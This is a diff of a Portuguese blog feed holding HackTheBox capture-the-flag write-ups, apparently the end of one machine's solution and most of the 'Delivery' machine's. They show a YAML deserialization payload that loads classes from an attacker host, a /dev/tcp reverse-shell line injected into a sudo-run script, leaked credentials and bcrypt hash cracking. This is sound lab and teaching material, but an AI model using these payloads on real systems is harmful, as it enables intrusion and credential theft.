 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">!!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
     !!java.net.URL [&#34;http://&lt;ip&gt;:8000/&#34;]
   ]]
-]</code></pre></div>
-
+]
+</code></pre></div>
     <img src="https://i.imgur.com/aAgLGVd.png"  alt="Envio da mensagem ao parser"  class="center"  style="border-radius: 8px;"  />
-
 
 
 <p>O resultado é uma &lsquo;reverse shell&rsquo; com o usuário tomcat.</p>
 
-
     <img src="https://i.imgur.com/VqtMyWy.png"  alt="Reverse shell"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Com acesso ao host foi utilizado o <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank">linPEAS</a> para enumerar e obter mais informações sobre a máquina. O resultado mostrou as credenciais do usuário admin no arquivo de configuração de usuários do Tomcat.</p>
-
+<p>Com acesso ao host foi utilizado o <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a> para enumerar e obter mais informações sobre a máquina. O resultado mostrou as credenciais do usuário admin no arquivo de configuração de usuários do Tomcat.</p>
 
     <img src="https://i.imgur.com/RAqNATf.png"  alt="Tomcat admin user"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">admin:whythereisalimit</code></pre></div>
-<p>Com estas credenciais foi feita a movimentação lateral, logando no usuário admin pelo terminal.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su - admin</code></pre></div>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">admin:whythereisalimit
+</code></pre></div><p>Com estas credenciais foi feita a movimentação lateral, logando no usuário admin pelo terminal.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su - admin
+</code></pre></div>
     <img src="https://i.imgur.com/GXkh9Y3.png"  alt="Su admin"  class="center"  style="border-radius: 8px;"  />
-
 
 
 <p>Obtendo a flag do usuário admin.</p>
 
-
     <img src="https://i.imgur.com/ptpMMcq.png"  alt="Flag admin user"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
-
 <p>Para escalar privilégio na máquina foi verificada as permissões do usuário admin com o sudo.</p>
-
 
     <img src="https://i.imgur.com/6ZaZ88X.png"  alt="Admin sudo"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go</code></pre></div>
-<p>Analisando o diretório do usuário admin foi encontrado um arquivo deploy.sh.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre></div><p>Analisando o diretório do usuário admin foi encontrado um arquivo deploy.sh.</p>
 
     <img src="https://i.imgur.com/GOH0lBA.png"  alt="Admin sudo"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>O usuário admin possui permissão para executar o aquivo index.go (feito em <a href="https://golang.org/" target="_blank">Go</a>). Este é o conteúdo do arquivo.</p>
-
+<p>O usuário admin possui permissão para executar o aquivo index.go (feito em <a href="https://golang.org/">Go</a>). Este é o conteúdo do arquivo.</p>
 
     <img src="https://i.imgur.com/nfM3Jyn.png"  alt="Arquivo index.go"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Juntando as partes, o index.go irá executar, com permissões de root, qualquer código malicioso injetado no deploy.sh. A última etapa é inserir um &lsquo;reverse shell&rsquo; neste arquivo e executar o index.go com sudo.</p>
-
 <p>Conteúdo injetado no arquivo deploy.sh.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1&#39;</span>;</code></pre></div>
-<p>Executando o arquivo index.go.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /usr/bin/go run /opt/wasm-functions/index.go</code></pre></div>
-<p>Obtendo a &lsquo;reverse shell&rsquo; como usuário root.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1&#39;</span>;
+</code></pre></div><p>Executando o arquivo index.go.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre></div><p>Obtendo a &lsquo;reverse shell&rsquo; como usuário root.</p>
 
     <img src="https://i.imgur.com/omQVD8w.png"  alt="Root shell"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtendo a flag do usuário root.</p>
-
 
     <img src="https://i.imgur.com/8a7KA8Z.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Neste &lsquo;writeup&rsquo; foi demonstrado como uma vulnerabilidade de desserialização via Web pode comprometer um servidor. Também vimos como uma permissão de execução de binário ou script pode permitir ao atacante o controle total da máquina.</p>
-
 <p>Até a próxima!</p>
 ]]></content>
         </item>
@@ -213,43 +422,33 @@ Sistema Operacional: Linux
 Nível de dificuldade: Easy
 Varredura e Enumeração Port Scan O primeiro passo é iniciar um scan preliminar pelas portas TCP abertas e logo em seguida um segundo scan para determinar a versão dos serviços que estão rodando no servidor.</description>
             <content type="html"><![CDATA[
-
-
     <img src="https://i.imgur.com/EeEdgR4.jpg"  alt="Delivery Cover"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Delivery&rsquo; do <a href="https://www.hackthebox.eu/" target="_blank">HackTheBox</a>. O autor desta máquina é o <a href="https://www.hackthebox.eu/profile/3769" target="_blank">ippsec</a>, um conhecido membro do HTB que costuma postar a resolução de máquinas retiradas em seu canal no <a href="https://www.youtube.com/c/ippsec" target="_blank">Youtube</a>. Ele também possui um <a href="https://ippsec.rocks/" target="_blank">site</a> que permite filtrar seus vídeos no Youtube de acordo com o que é informado na busca.</p>
-
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Delivery&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>. O autor desta máquina é o <a href="https://www.hackthebox.eu/profile/3769">ippsec</a>, um conhecido membro do HTB que costuma postar a resolução de máquinas retiradas em seu canal no <a href="https://www.youtube.com/c/ippsec">Youtube</a>. Ele também possui um <a href="https://ippsec.rocks/">site</a> que permite filtrar seus vídeos no Youtube de acordo com o que é informado na busca.</p>
 <h3 id="informações-da-máquina">Informações da Máquina</h3>
-
 <p>IP: 10.10.10.222</p>
-
 <p>Sistema Operacional: Linux</p>
-
 <p>Nível de dificuldade: Easy</p>
-
 <h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
-
 <h4 id="port-scan">Port Scan</h4>
-
 <p>O primeiro passo é iniciar um scan preliminar pelas portas TCP abertas e logo em seguida um segundo scan para determinar a versão dos serviços que estão rodando no servidor. Este é o resultado do Nmap.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Fri May 14 15:27:04 2021 as: nmap -v -sC -sV -p 22,80,8065 -Pn -oN details 10.10.10.222</span>
-Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10</span>.10.10.222
-Host is up <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span>.31s latency<span style="color:#f92672">)</span>.
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.222
+Host is up <span style="color:#f92672">(</span>0.31s latency<span style="color:#f92672">)</span>.
 
 PORT     STATE SERVICE VERSION
-<span style="color:#ae81ff">22</span>/tcp   open  ssh     OpenSSH <span style="color:#ae81ff">7</span>.9p1 Debian <span style="color:#ae81ff">10</span>+deb10u2 <span style="color:#f92672">(</span>protocol <span style="color:#ae81ff">2</span>.0<span style="color:#f92672">)</span>
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
 | ssh-hostkey: 
 |   <span style="color:#ae81ff">2048</span> 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
 |   <span style="color:#ae81ff">256</span> 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
 |_  <span style="color:#ae81ff">256</span> b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-<span style="color:#ae81ff">80</span>/tcp   open  http    nginx <span style="color:#ae81ff">1</span>.14.2
+80/tcp   open  http    nginx 1.14.2
 | http-methods: 
 |_  Supported Methods: GET HEAD
 |_http-server-header: nginx/1.14.2
 |_http-title: Welcome
-<span style="color:#ae81ff">8065</span>/tcp open  unknown
+8065/tcp open  unknown
 | fingerprint-strings: 
 |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
 |     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
@@ -259,22 +458,22 @@ PORT     STATE SERVICE VERSION
 |   GetRequest: 
 |     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
 |     Accept-Ranges: bytes
-|     Cache-Control: no-cache, max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">31556926</span>, public
+|     Cache-Control: no-cache, max-age<span style="color:#f92672">=</span>31556926, public
 |     Content-Length: <span style="color:#ae81ff">3108</span>
 |     Content-Security-Policy: frame-ancestors <span style="color:#e6db74">&#39;self&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> cdn.rudderlabs.com
 |     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
-|     Last-Modified: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">16</span>:47:36 GMT
+|     Last-Modified: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 16:47:36 GMT
 |     X-Frame-Options: SAMEORIGIN
 |     X-Request-Id: 6iwifyweep85fkyk7iimfj8kfo
-|     X-Version-Id: <span style="color:#ae81ff">5</span>.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
-|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">18</span>:38:43 GMT
+|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 18:38:43 GMT
 |     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robots&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noindex, nofollow&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mobile-web-app-capable&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yes&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application-name&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mattermost&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;format-detection&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;telephone=no&#34;</span>&gt;&lt;link re
 |   HTTPOptions: 
 |     HTTP/1.0 <span style="color:#ae81ff">405</span> Method Not Allowed
-|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">18</span>:38:44 GMT
+|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 18:38:44 GMT
 |_    Content-Length: <span style="color:#ae81ff">0</span>
 <span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8065-TCP:V<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>.91%I<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>%D<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>/14%Time<span style="color:#f92672">=</span>609EC102%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+SF-Port8065-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>5/14%Time<span style="color:#f92672">=</span>609EC102%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
 SF:nericLines,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
 </span><span style="color:#e6db74">SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
 </span><span style="color:#e6db74">SF:20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,DF3,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
@@ -309,58 +508,45 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style="color:#75715e"># Nmap done at Fri May 14 15:29:11 2021 -- 1 IP address (1 host up) scanned in 127.39 seconds</span></code></pre></div>
-<h4 id="webserver">Webserver</h4>
-
+<span style="color:#75715e"># Nmap done at Fri May 14 15:29:11 2021 -- 1 IP address (1 host up) scanned in 127.39 seconds</span>
+</code></pre></div><h4 id="webserver">Webserver</h4>
 <p>Para acessar o site pelo seu domínio e não pelo seu ip basta inserir a linha correspondente ao arquivo /etc/hosts.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb</code></pre></div>
-<p>O site poderá ser acessado pela seguinte URL.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb</code></pre></div>
-<p>Existem três portas abertas no servidor: 22, 80 e 8065. Acessando pela porta 80 encontramos a seguinte página.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb
+</code></pre></div><p>O site poderá ser acessado pela seguinte URL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb
+</code></pre></div><p>Existem três portas abertas no servidor: 22, 80 e 8065. Acessando pela porta 80 encontramos a seguinte página.</p>
 
     <img src="https://i.imgur.com/IFgz2yF.png"  alt="Delivery"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Analisando a página o botão &ldquo;Contact Us&rdquo; aponta para duas aplicações, a &ldquo;HelpDesk&rdquo; e &ldquo;MatterMost server&rdquo;:</p>
-
 
     <img src="https://i.imgur.com/RZ6uWsh.png"  alt="Contact-Us"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Adicionado o subdomínio ao /etc/hosts.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb helpdesk.delivery.htb</code></pre></div>
-<p>A aplicação agora pode ser acessada diretamente pela sua URL.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb helpdesk.delivery.htb
+</code></pre></div><p>A aplicação agora pode ser acessada diretamente pela sua URL.</p>
 
     <img src="https://i.imgur.com/LpeunWd.png"  alt="Help Desk"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Trata-se de um sistema de chamados <a href="https://osticket.com/" target="_blank">OS Ticket</a>, uma plataforma web de código fonte aberto (open source) que permite gerenciar chamados. Antes de buscar vulnerabilidades na aplicação foi efetuado o registro de um ticket para obter alguma informação que permita algum tipo de acesso administrativo.</p>
-
+<p>Trata-se de um sistema de chamados <a href="https://osticket.com/">OS Ticket</a>, uma plataforma web de código fonte aberto (open source) que permite gerenciar chamados. Antes de buscar vulnerabilidades na aplicação foi efetuado o registro de um ticket para obter alguma informação que permita algum tipo de acesso administrativo.</p>
 
     <img src="https://i.imgur.com/fhuzHu3.png"  alt="Criar ticket"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Após o registro do ticket foi gerado um e-mail pelo sistema para que o usuário possa acompanhar o status do chamado. Esta é a informação relevante obtida pelo sistema até o momento, o e-mail.</p>
-
 
     <img src="https://i.imgur.com/ayhfpPN.png"  alt="Ticket criado"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>A segunda aplicação que roda na porta 8065 é o Mattermost e este é o seu propósito segundo o <a href="https://mattermost.com/incident-collaboration/" target="_blank">site</a> do fabricante:</p>
+<p>A segunda aplicação que roda na porta 8065 é o Mattermost e este é o seu propósito segundo o <a href="https://mattermost.com/incident-collaboration/">site</a> do fabricante:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">O Mattermost foi desenvolvido como um centro de comando de comunicação
 para ajudar as equipes de DevOps a orquestrar fluxos de trabalho
-de colaboração de incidentes urgentes.</code></pre></div>
-<h3 id="vulnerabilidade">Vulnerabilidade</h3>
-
-<p>Acessando esta aplicação na porta 8065 surge uma tela de login e logo abaixo um link &ldquo;Create one now&rdquo; que direciona para a tela de cadastro de usuário. O problema é que ao fazer o cadastro o sistema envia um link de confirmação ao e-mail informado. Como não há nenhum serviço de e-mail no servidor com a porta exposta, não há como explorar o serviço e visualizar o link de confirmação. A opção seria receber o e-mail do Mattermost de outra forma, talvez pelo OsTicket. Ao fazer uma pesquisa sobre recebimento de e-mails no <a href="https://docs.osticket.com/en/latest/Getting%20Started/Email%20Settings.html#:~:text=osTicket%20allows%20you%20to%20setup,support%20requests%20in%20one%20place." target="_blank">site</a> do OSTicket é possível encontrar a seguinte informação:</p>
-
+de colaboração de incidentes urgentes.
+</code></pre></div><h3 id="vulnerabilidade">Vulnerabilidade</h3>
+<p>Acessando esta aplicação na porta 8065 surge uma tela de login e logo abaixo um link &ldquo;Create one now&rdquo; que direciona para a tela de cadastro de usuário. O problema é que ao fazer o cadastro o sistema envia um link de confirmação ao e-mail informado. Como não há nenhum serviço de e-mail no servidor com a porta exposta, não há como explorar o serviço e visualizar o link de confirmação. A opção seria receber o e-mail do Mattermost de outra forma, talvez pelo OsTicket. Ao fazer uma pesquisa sobre recebimento de e-mails no <a href="https://docs.osticket.com/en/latest/Getting%20Started/Email%20Settings.html#:~:text=osTicket%20allows%20you%20to%20setup,support%20requests%20in%20one%20place.">site</a> do OSTicket é possível encontrar a seguinte informação:</p>
 
     <img src="https://i.imgur.com/GK8aRn2.png"  alt="OSTicket routing e-mails"  class="center"  style="border-radius: 8px;"  />
 
@@ -370,152 +556,113 @@ de sistema para sistema depende de sua preferência pessoal.
 O OsTicket atualmente suporta piping (aliases) e métodos
 de pesquisa POP3 / IMAP para rotear e-mails recebidos.
 Os tickets são roteados para o departamento e atribuídos
-a uma prioridade padrão associada ao e-mail.</code></pre></div>
-<p>No caso, se há roteamento de e-mails de sistema para sistema e de departamento para departamento então o que for enviado pelo sistema Mattermost poderá ser recebido no OSticket. E para visualizar o e-mail será necessário acessar o próprio ticket previamente cadastrado.</p>
-
+a uma prioridade padrão associada ao e-mail.
+</code></pre></div><p>No caso, se há roteamento de e-mails de sistema para sistema e de departamento para departamento então o que for enviado pelo sistema Mattermost poderá ser recebido no OSticket. E para visualizar o e-mail será necessário acessar o próprio ticket previamente cadastrado.</p>
 
     <img src="https://i.imgur.com/3xxHju9.png"  alt="Mattermost cadastro"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Ao enviar o formulário pelo site do Mattermost uma mensagem de confirmação de cadastro é recebida pelo OSTicket.</p>
-
 
     <img src="https://i.imgur.com/j591Qrg.png"  alt="OSTicket - Confirmação de cadastro"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>O link gerado pelo Mattermost para confirmar o cadastro no sistema.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb:8065/do_verify_email?token=j3wgng8a3qb6tjeescmphz4dhjx9a4edj84i514tyyqy35wz9kcbix87hikh4shk&amp;email=4069966%40delivery.htb</code></pre></div>
-<p>Acessando o link e confirmando o cadastro o usuário é direcionado para a página inicial do Mattermost com a opção para juntar-se ao time &ldquo;internal&rdquo;.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb:8065/do_verify_email?token=j3wgng8a3qb6tjeescmphz4dhjx9a4edj84i514tyyqy35wz9kcbix87hikh4shk&amp;email=4069966%40delivery.htb
+</code></pre></div><p>Acessando o link e confirmando o cadastro o usuário é direcionado para a página inicial do Mattermost com a opção para juntar-se ao time &ldquo;internal&rdquo;.</p>
 
     <img src="https://i.imgur.com/3SJ0HFT.png"  alt="Mattermost inicial"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Logo em seguida surge o &lsquo;dashboard&rsquo; para que o usuário possa comunicar-se com outros usuários.</p>
-
 
     <img src="https://i.imgur.com/XLOTuS6.png"  alt="Mattermost dashboard"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <h3 id="exploração">Exploração</h3>
-
 <p>Explorando as mensagens no &lsquo;dashboard&rsquo; foi encontrada uma mensagem do usuário root e nela uma credencial de acesso.</p>
-
 
     <img src="https://i.imgur.com/6ZdXPsf.png"  alt="Mattermost mensagem root"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW</code></pre></div>
-<p>Com esta credencial é possível conectar ao host pelo SSH na porta 22.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW
+</code></pre></div><p>Com esta credencial é possível conectar ao host pelo SSH na porta 22.</p>
 
     <img src="https://i.imgur.com/Dpa9NcJ.png"  alt="Acesso SSH"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtendo a flag do usuário logado.</p>
-
 
     <img src="https://i.imgur.com/jG2x3Tv.png"  alt="Flag user"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Esta credencial não permite acesso ao banco de dados Mysql, então uma enumeração de diretórios e arquivos na máquina foi necessária. Inicialmente foi feita a varredura por arquivos de configuração dos sistemas que rodam no servidor. O resultado mostrou que o Mattermost possui credenciais para acesso ao banco de dados no seu arquivo de configuração.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/opt/mattermost/config/config.json</code></pre></div>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/opt/mattermost/config/config.json
+</code></pre></div>
     <img src="https://i.imgur.com/MwFMiyh.png"  alt="Mysql credenciais"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW</code></pre></div>
-<p>Acessando o Mysql com a credencial encontrada.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW
+</code></pre></div><p>Acessando o Mysql com a credencial encontrada.</p>
 
     <img src="https://i.imgur.com/JebaxGn.png"  alt="Mysql login"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Listando os bancos de dados no servidor.</p>
-
 
     <img src="https://i.imgur.com/b4wX1Wp.png"  alt="Mysql databases"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Acessando a tabela de usuários.</p>
-
 
     <img src="https://i.imgur.com/366lnbd.png"  alt="Mysql tabela de usuários"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Nesta tabela foi encontrada a credencial do usuário root.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</code></pre></div>
-<h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+</code></pre></div><h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
 <p>As duas ferramentas mais usadas para a quebra de hashes são o john e o hashcat. Na lista de formatos suportados do hashcat a hash é reconhecida como &ldquo;bcrypt/blowfish&rdquo;.</p>
-
 
     <img src="https://i.imgur.com/G4m1hdx.png"  alt="Hashcat bcrypt"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Antes de efetuar a quebra da hash com a wordlist rockyou.txt é necessário uma atenção especial na mensagem do root pelo Mattermost, onde alerta que a senha &ldquo;PleaseSubscribe!&rdquo; não estará na wordlist e que para proceder com a quebra é necessário criar uma wordlist personalizada baseada nas &ldquo;rules&rdquo; do hashcat.</p>
-
 
     <img src="https://i.imgur.com/Kksj2oW.png"  alt="Root wordlist"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>O hashcat possui um <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack" target="_blank">manual</a> que explica como criar estas wordlists personalizadas baseadas em um &ldquo;pattern&rdquo;.</p>
-
+<p>O hashcat possui um <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">manual</a> que explica como criar estas wordlists personalizadas baseadas em um &ldquo;pattern&rdquo;.</p>
 <p>Portanto, deve-se criar dois arquivos. Um arquivo com a hash e outro com a senha &ldquo;PleaseSubscribe!&rdquo;. Esta senha será usada como base para criar outras senhas variadas e assim gerar uma wordlist personalizada.</p>
-
 
     <img src="https://i.imgur.com/0dGC9wY.png"  alt="Arquivos"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Existem diversos formatos de &ldquo;rules&rdquo; no hashcat para a geração de wordlist personalizada.</p>
